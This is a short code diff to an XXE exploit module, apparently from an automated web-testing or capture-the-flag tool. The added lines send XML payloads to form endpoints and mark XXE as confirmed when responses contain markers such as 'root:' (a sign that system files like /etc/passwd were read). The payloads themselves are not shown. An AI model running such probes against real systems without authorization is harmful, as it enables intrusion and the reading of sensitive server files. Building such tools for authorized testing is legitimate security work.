@@ -19,5 +19,10 @@ class XXEModule(ExploitModule):
                     r=await ctx.http.request("POST",action,headers={"Content-Type":"application/xml","Accept":"*/*"},content=payload,follow_redirects=False)
                     ctx.inspect_source(str(r.url),r.text,payload,i,r.headers.get("content-type",""))
                     evidence.append(f"{action} -> {r.status_code}, {len(r.text)} bytes")
+                    low = r.text.lower()
+                    if "ctf-xxe-probe" in low or "localhost" in low or "root:" in low:
+                        ctx.add_finding(action, payload, self.name, f"HTTP {r.status_code}; XML entity/file marker observed", confidence="high")
+                        ctx.artifacts.set("xxe.hit", action)
+                        return ExploitResult(self.name, "signal", "Potential XXE confirmed by entity/file marker", evidence=action)
                 except Exception as exc: evidence.append(str(exc))
         return ExploitResult(self.name,"no-signal","XXE probes completed",evidence="\n".join(evidence[:20]))
